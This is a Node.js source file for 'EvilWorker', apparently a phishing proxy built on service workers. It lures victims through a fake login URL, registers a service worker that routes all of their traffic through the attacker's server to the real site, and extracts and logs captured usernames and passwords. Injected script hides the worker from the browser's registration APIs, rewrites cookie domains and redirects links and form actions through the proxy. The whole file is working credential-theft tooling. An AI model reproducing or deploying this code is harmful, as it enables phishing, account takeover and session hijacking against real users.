const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");

// EvilWorker Configuration
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
const VICTIM_SESSIONS = {};

// Create HTTP server
const server = http.createServer((req, res) => {
    const { method, url, headers } = req;
    const currentSession = getUserSession(headers.cookie);

    // Handle EvilWorker login URLs
    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                res.writeHead(200, { 
                    "Content-Type": "text/html",
                    "Set-Cookie": `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`
                });
                res.end(getIndexHTML());
            } else {
                res.writeHead(200, { "Content-Type": "text/html" });
                res.end(getIndexHTML());
            }
        } catch (error) {
            console.error("Phishing URL parsing failed", error);
            res.writeHead(404, { "Content-Type": "text/html" });
            res.end(getNotFoundHTML());
        }
        return;
    }

    // Handle service worker
    if (url === PROXY_PATHNAMES.serviceWorker) {
        res.writeHead(200, { 
            "Content-Type": "text/javascript",
            "Service-Worker-Allowed": "/"
        });
        res.end(getServiceWorkerJS());
        return;
    }

    // Handle script injection
    if (url === PROXY_PATHNAMES.script) {
        res.writeHead(200, { "Content-Type": "text/javascript" });
        res.end(getScriptJS());
        return;
    }

    // Handle favicon
    if (url === PROXY_PATHNAMES.favicon) {
        res.writeHead(200, { "Content-Type": "image/x-icon" });
        res.end('');
        return;
    }

    // Handle proxy requests
    if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (method === 'POST') {
            let body = '';
            req.on('data', chunk => {
                body += chunk.toString();
            });
            req.on('end', async () => {
                try {
                    const proxyRequest = JSON.parse(body);
                    const result = await makeProxyRequest(proxyRequest, currentSession, headers);
                    res.writeHead(result.statusCode, result.headers);
                    res.end(result.body);
                } catch (error) {
                    console.error("Proxy request failed", error);
                    res.writeHead(502, { "Content-Type": "text/html" });
                    res.end('<h1>502 Bad Gateway</h1>');
                }
            });
            return;
        }
    }

    // Default response
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end('<h1>EvilWorker Proxy Server</h1><p>Server is running!</p>');
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`EvilWorker server running on port ${PORT}`);
});

// Helper functions
function getUserSession(cookieHeader) {
    if (!cookieHeader) return;
    
    const cookies = cookieHeader.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");
        
        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {
        value: cookieValue,
        cookies: [],
        logFilename: `${phishedURL.host}__${new Date().toISOString()}`,
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: `${phishedURL.pathname}${phishedURL.search}`,
        port: phishedURL.port,
        host: phishedURL.host
    };

    console.log(`New victim session started: ${cookieName} for ${phishedURL.host}`);
    
    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function makeProxyRequest(proxyRequest, currentSession, headers) {
    const targetURL = new URL(proxyRequest.url);
    const protocol = targetURL.protocol === 'https:' ? https : http;
    
    const options = {
        hostname: targetURL.hostname,
        port: targetURL.port || (targetURL.protocol === 'https:' ? 443 : 80),
        path: targetURL.pathname + targetURL.search,
        method: proxyRequest.method,
        headers: {
            ...proxyRequest.headers,
            'host': targetURL.host
        }
    };

    return new Promise((resolve, reject) => {
        const req = protocol.request(options, (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                // Log the transaction
                logHTTPProxyTransaction(proxyRequest, res, data, currentSession);
                
                resolve({
                    statusCode: res.statusCode,
                    headers: {
                        'Content-Type': res.headers['content-type'] || 'text/html',
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
                        'Access-Control-Allow-Headers': 'Content-Type, Authorization'
                    },
                    body: data
                });
            });
        });

        req.on('error', (error) => {
            console.error('Proxy request error:', error);
            reject(error);
        });

        if (proxyRequest.body) {
            req.write(proxyRequest.body);
        }
        
        req.end();
    });
}

async function logHTTPProxyTransaction(proxyRequest, proxyResponse, responseBody, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: proxyRequest.url,
        proxyRequestMethod: proxyRequest.method,
        proxyRequestHeaders: proxyRequest.headers,
        proxyRequestBody: proxyRequest.body,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers,
        proxyResponseBody: responseBody
    };
    
    // Check for credentials
    const requestBodyStr = proxyRequest.body || '';
    const requestPath = new URL(proxyRequest.url).pathname;
    
    if (requestBodyStr.includes('password') || requestBodyStr.includes('passwd') || 
        requestPath.includes('login') || requestPath.includes('signin')) {
        
        let username = '';
        let password = '';
        
        // Extract credentials from request body
        const passwordMatch = requestBodyStr.match(/(?:password|passwd)["\s:=]+([^&"\s,}]+)/i);
        const usernameMatch = requestBodyStr.match(/(?:username|email|login|loginfmt)["\s:=]+([^&"\s,}]+)/i);
        
        if (passwordMatch) password = decodeURIComponent(passwordMatch[1]);
        if (usernameMatch) username = decodeURIComponent(usernameMatch[1]);
        
        if (username || password) {
            console.log(`🔑 CREDENTIALS CAPTURED for session ${currentSession}:`);
            console.log(`👤 Username: ${username}`);
            console.log(`🔐 Password: ${password}`);
        }
    }
}

function getIndexHTML() {
    return `<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
</head>

<body>
    <script>
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("/service_worker_Mz8XO2ny1Pg5.js", {
                scope: "/",
            })
                .then((registration) => {
                    const phishedParameterURL = new URL(self.location.href).searchParams.get("redirect_urI");
                    const phishedURL = new URL(decodeURIComponent(phishedParameterURL));

                    self.location.replace(\`\${phishedURL.pathname}\${phishedURL.search}\`);
                })
                .catch((error) => {
                    console.error(\`Service worker registration failed: \${error}\`);
                });
        }
        else {
            console.error("Service workers are not supported by this browser");
        }
    </script>
</body>

</html>`;
}

function getNotFoundHTML() {
    return `<!DOCTYPE html>
<html>
<head><title>404 Not Found</title></head>
<body>
    <h1>404 Not Found</h1>
    <p>The requested page could not be found.</p>
</body>
</html>`;
}

function getServiceWorkerJS() {
    return `self.addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = \`\${self.location.origin}/lNv1pC9AWPUY4gbidyBO\`;

    try {
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error(\`Fetching \${proxyRequestURL} failed: \${error}\`);
    }
}`;
}

function getScriptJS() {
    return `(function () {
    const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;

    navigator.serviceWorker.getRegistration = function (_scope) {
        return originalServiceWorkerGetRegistrationDescriptor.apply(this, arguments)
            .then(registration => {

                if (registration &&
                    registration.active &&
                    registration.active.scriptURL &&
                    registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js")) {

                    return undefined;
                }
                return registration;
            });
    };
})();

(function () {
    const originalServiceWorkerGetRegistrationsDescriptor = navigator.serviceWorker.getRegistrations;

    navigator.serviceWorker.getRegistrations = function () {
        return originalServiceWorkerGetRegistrationsDescriptor.apply(this, arguments)
            .then(registrations => {
                return registrations.filter(registration => {

                    return !(registration.active &&
                        registration.active.scriptURL &&
                        registration.active.scriptURL.endsWith("service_worker_Mz8XO2ny1Pg5.js"));
                })
            });
    };
})();

(function () {
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, "cookie");

    Object.defineProperty(document, "cookie", {
        ...originalCookieDescriptor,
        get() {
            return originalCookieDescriptor.get.call(document);
        },
        set(cookie) {
            const proxyRequestURL = \`\${self.location.origin}/JSCookie_6X7dRqLg90mH\`;
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", proxyRequestURL, false);
                xhr.setRequestHeader("Content-Type", "text/plain");
                xhr.send(cookie);

                const validDomains = JSON.parse(xhr.responseText);
                let modifiedCookie = "";

                const cookieAttributes = cookie.split(";");
                for (const cookieAttribute of cookieAttributes) {

                    let attribute = cookieAttribute.trim();
                    if (attribute) {

                        const cookieDomainMatch = attribute.match(/^DOMAIN\\s*=(.*)$/i);
                        if (cookieDomainMatch) {

                            const cookieDomain = cookieDomainMatch[1].replace(/^\\./, "").trim();
                            if (cookieDomain && validDomains.includes(cookieDomain)) {
                                attribute = \`Domain=\${self.location.hostname}\`;
                            }
                        }
                        modifiedCookie += \`\${attribute}; \`;
                    }
                }
                originalCookieDescriptor.set.call(document, modifiedCookie.trim());
            }
            catch (error) {
                console.error(\`Fetching \${proxyRequestURL} failed: \${error}\`);
            }
        }
    });
})();


const observer = new MutationObserver((mutations) => {
    for (const mutation of mutations) {
        if (mutation.type === "attributes") {
            updateHTMLAttribute(mutation.target, mutation.attributeName);
        }

        else if (mutation.type === "childList") {
            for (const node of mutation.addedNodes) {
                for (const attribute of attributes) {
                    if (node[attribute]) {
                        updateHTMLAttribute(node, attribute);
                    }
                }
            }
        }
    }
});

const attributes = ["href", "action"];

observer.observe(document.documentElement, {
    childList: true,
    subtree: true,
    attributeFilter: attributes
});

function updateHTMLAttribute(htmlNode, htmlAttribute) {
    try {
        const htmlAttributeURL = new URL(htmlNode[htmlAttribute]);

        if (htmlAttributeURL.origin !== self.location.origin) {
            const proxyRequestURL = new URL(\`\${self.location.origin}/Mutation_o5y3f4O7jMGW\`);
            proxyRequestURL.searchParams.append("redirect_urI", encodeURIComponent(htmlAttributeURL.href));

            htmlNode[htmlAttribute] = proxyRequestURL;
        }
    }
    catch { }
}`;
}